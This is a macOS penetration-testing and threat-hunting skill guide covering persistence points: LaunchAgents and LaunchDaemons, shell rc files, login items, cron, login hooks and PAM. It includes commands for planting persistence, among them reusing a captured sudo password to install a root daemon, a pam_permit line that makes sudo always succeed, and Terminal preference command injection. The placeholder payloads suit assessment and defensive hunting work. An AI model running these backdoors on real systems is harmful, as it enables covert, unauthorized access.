---
name: analyzing-macos-persistence-and-autostart
description: Enumerating, planting, and hunting macOS persistence and auto-start (ASEP) locations during authorized
  engagements - LaunchAgents/LaunchDaemons, shell rc files, login items, cron/at/periodic jobs, login/logout hooks,
  Dock and Terminal/iTerm2 preferences, audio/QuickLook/Spotlight plugins, PAM modules, Authorization plugins, emond,
  and StartupItems - and mapping each to its trigger, required privilege, and sandbox/TCC implications.
domain: cybersecurity
subdomain: macos-security
tags:
- penetration-testing
- macos
- persistence
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Analyzing macOS Persistence and Autostart

## When to Use

- During authorized macOS assessments to
 establish or demonstrate persistence after gaining code execution
- During threat hunting / DFIR to enumerate Auto-Start Extensibility Points (ASEPs) and spot implants
- When you need a persistence method that survives reboot, relogin, or a specific user action
- When choosing a technique by its required privilege (user vs root) and sandbox/TCC posture
- macOS exposes many ASEPs beyond LaunchAgents; map each to its trigger and permission cost

## Critical: Techniques Most Often Missed

### 1. User-owned plist in a system LaunchDaemon folder runs as the USER

A plist's owner — not its directory — determines the run identity. A user-owned plist in `/Library/LaunchDaemons` executes as that user, not root. Conversely, infostealers reuse a captured sudo password to drop a root daemon:

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```

**How to CONFIRM:** `ls -l@ /Library/LaunchDaemons/*.plist` for owner and the `@` xattr marker; verify run identity with `launchctl list` and the spawned process's `uid`.

### 2. Login Item ZIP / LaunchAgents drop

A ZIP stored as a Login Item is opened by Archive Utility; if it contains `LaunchAgents/file.plist` (a folder that may not exist yet), that folder is created and the backdoor plist is added — executing on the next login. Same idea with `.bash_profile`/`.zshenv` in the user HOME.

```bash
osascript -e 'tell application "System Events" to get the name of every login item'
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/itemname", hidden:false}'
# Login items also live in:
ls -l ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent
plutil -p /var/db/com.apple.xpc.launchd/loginitems.501.plist 2>/dev/null
```

**How to CONFIRM:** the login item appears via System Events enumeration or in the backgroundtaskmanagementagent store; a planted `~/Library/LaunchAgents/*.plist` exists post-login.

### 3. Reopen/Terminal/iTerm2 preference command injection (TCC inheritance)

App preference plists can carry commands that run when the app opens — and Terminal/iTerm2 often hold the user's FDA, so the payload inherits it.

```bash
# Terminal startup command
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/pwn'" \
  $HOME/Library/Preferences/com.apple.Terminal.plist
# Reopen-at-login app list
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
# iTerm2 AutoLaunch scripts
ls "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch"
```

A `.terminal`, `.command`, or `.tool` file opened anywhere also launches Terminal with its privileges.

**How to CONFIRM:** read back the `CommandString`/`Initial Text` value; opening the terminal app produces the side effect (e.g., `/tmp/pwn`).

## Workflow

### Step 1: Baseline the launchd ASEPs

```bash
launchctl list                                   # currently loaded jobs
ls -l@ /Library/LaunchAgents /Library/LaunchDaemons \
       /System/Library/LaunchAgents /System/Library/LaunchDaemons \
       ~/Library/LaunchAgents ~/Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/<job>.plist     # inspect Program/ProgramArguments/RunAtLoad/KeepAlive
```

Triggers: `/Library` and `/System/Library` agents/daemons fire at reboot (root required); `~/Library` agents fire at relogin (no root). Load without reboot via `launchctl load <plist>`; verify nothing overrides with `sudo launchctl load -w ...`.

### Step 2: Shell and SSH startup files

```bash
# zsh (default shell): per-user
ls -la ~/.zshrc ~/.zshenv ~/.zprofile ~/.zlogin ~/.zlogout
# zsh system-wide (root): /etc/zshenv /etc/zprofile /etc/zshrc /etc/zlogin /etc/zlogout
echo 'touch /tmp/persist' >> ~/.zshrc            # triggers on terminal open
# SSH rc (FDA-capable; ssh must be enabled)
cat ~/.ssh/rc /etc/ssh/sshrc 2>/dev/null
```

`~/.zshenv` is especially powerful: it runs even non-interactively (and during `sudo -s`).

### Step 3: Scheduled execution — cron, at, periodic

```bash
crontab -l                                       # current user jobs
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/   # root for system tabs
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron && crontab /tmp/cron
echo "echo 11 > /tmp/at.txt" | at now+1          # at must be enabled (atrun daemon)
```

`/etc/periodic/{daily,weekly,monthly}` run via `/System/Library/LaunchDaemons/com.apple.periodic*` but execute as the file owner (not useful for privesc).

### Step 4: Login/logout hooks, Dock, and GUI app plugins

```bash
# deprecated but functional login/logout hooks
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
# Dock entries (also used for app masquerading)
plutil -p ~/Library/Preferences/com.apple.dock.plist
# plugin ASEPs
ls -l /Library/Audio/Plug-Ins/HAL ~/Library/Audio/Plug-ins/Components   # restart coreaudiod
ls -l /Library/QuickLook ~/Library/QuickLook                            # space-bar preview
```

Third-party automation tools are also ASEPs: xbar (`~/Library/Application Support/xbar/plugins/`), Hammerspoon (`~/.hammerspoon/init.lua`), BetterTouchTool, Alfred workflows — many already hold Accessibility/Automation/FDA grants.

### Step 5: Deeper/root-level persistence

```bash
# PAM: make sudo always succeed (TCC-protected dir; user may be prompted)
ls -l /etc/pam.d
# prepend to /etc/pam.d/sudo:  auth  sufficient  pam_permit.so
# Authorization plugin (root) - runs at login, classic credential theft
ls -l /Library/Security/SecurityAgentPlugins/
# emond (obscure, often unmonitored)
ls -l /private/var/db/emondClients
# StartupItems (deprecated): /Library/StartupItems , /System/Library/StartupItems
# kexts: /Library/Extensions , /System/Library/Extensions (kextstat / kextload)
```

### Step 6: Document trigger, privilege, and detectability

For each implant record the **path**, **trigger** (reboot / relogin / app-open / timer / user action), **privilege required**, and whether it offers **sandbox bypass** or **TCC inheritance**, so defenders can prioritize remediation.

## Key Concepts

| Concept | Description |
|---------|-------------|
| **ASEP** | Auto-Start Extensibility Point — any location/mechanism that triggers code on an event |
| **launchd** | PID 1; reads/executes LaunchAgents (per-user) and LaunchDaemons (system) plist jobs |
| **Agent vs Daemon** | Agents load at user login (may use GUI); daemons load at system startup (background) |
| **Plist owner = run identity** | A user-owned plist runs as that user even in a system daemon folder |
| **Login Items** | Apps launched at login, stored in backgroundtaskmanagementagent / loginitems plist |
| **Shell rc files** | `~/.zshenv`/`.zshrc`/`.bash_profile` etc.; `~/.zshenv` even runs non-interactively |
| **Login/Logout hooks** | Deprecated `com.apple.loginwindow` LoginHook/LogoutHook scripts |
| **Plugin ASEPs** | Audio (HAL/Components), QuickLook, Spotlight importers loaded by host processes |
| **PAM / Authorization plugins** | `/etc/pam.d` and `/Library/Security/SecurityAgentPlugins` for auth-time persistence |
| **emond / StartupItems / kext** | Legacy/obscure mechanisms still usable for stealth persistence |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **launchctl** | List, load, unload launchd jobs; `-w` to override disabled state |
| **plutil** | Print/convert plist jobs and preference files |
| **defaults** | Read/write login hooks, reopen-at-login list, app preferences |
| **PlistBuddy** | Surgically add/set keys (Terminal CommandString, reopen list) |
| **osascript** | Manage Login Items via System Events; AppleScript autoload payloads |
| **crontab / at / periodic** | Scheduled-task persistence |
| **ls -l@ / xattr** | Reveal ownership and extended-attribute markers on ASEP files |
| **kextstat / kextload** | Inspect and load kernel extensions |

## Common Scenarios

### Scenario 1: User LaunchAgent backdoor
A plist in `~/Library/LaunchAgents` with `RunAtLoad`/`KeepAlive` re-executes a payload at every login with no root needed and survives reboot via relogin.

### Scenario 2: Root LaunchDaemon via captured password
An infostealer reuses a phished sudo password to install `com.finder.helper.plist` as root:wheel and `launchctl load`s it for system-startup persistence.

### Scenario 3: Terminal/iTerm2 FDA inheritance
Injecting a startup CommandString into `com.apple.Terminal.plist` runs the payload whenever the user opens Terminal, inheriting Full Disk Access.

### Scenario 4: Authorization plugin credential theft
A bundle in `/Library/Security/SecurityAgentPlugins/` plus an authorization-db rule executes at every login, enabling persistent credential capture and a `/etc/sudoers` NOPASSWD backdoor.

## Output Format

```
## macOS Persistence Finding

**Finding**: Persistence via user LaunchAgent
**Severity**: Medium (CVSS 6.1)
**Mechanism**: ~/Library/LaunchAgents (RunAtLoad)
**Host**: macHost.local (macOS 14.4)

### Reproduction Steps
1. Write com.attacker.helper.plist to ~/Library/LaunchAgents with RunAtLoad=true
2. launchctl load ~/Library/LaunchAgents/com.attacker.helper.plist
3. Log out / log in -> payload re-executes as the user

### ASEP Summary
| Path | Trigger | Privilege | Notes |
|------|---------|-----------|-------|
| ~/Library/LaunchAgents/com.attacker.helper.plist | Relogin/reboot | User | Survives reboot, no root |
| ~/.zshenv | Terminal open / sudo -s | User | Runs non-interactively |

### Recommendation
1. Baseline and monitor all LaunchAgents/LaunchDaemons for unexpected plists
2. Alert on writes to shell rc files, login hooks, and SecurityAgentPlugins
3. Verify plist ownership; user-owned daemons should be investigated
4. Use MDM + EDR to detect new ASEPs and unsigned autostart binaries
5. Inspect emond, periodic, and StartupItems directories during DFIR
```
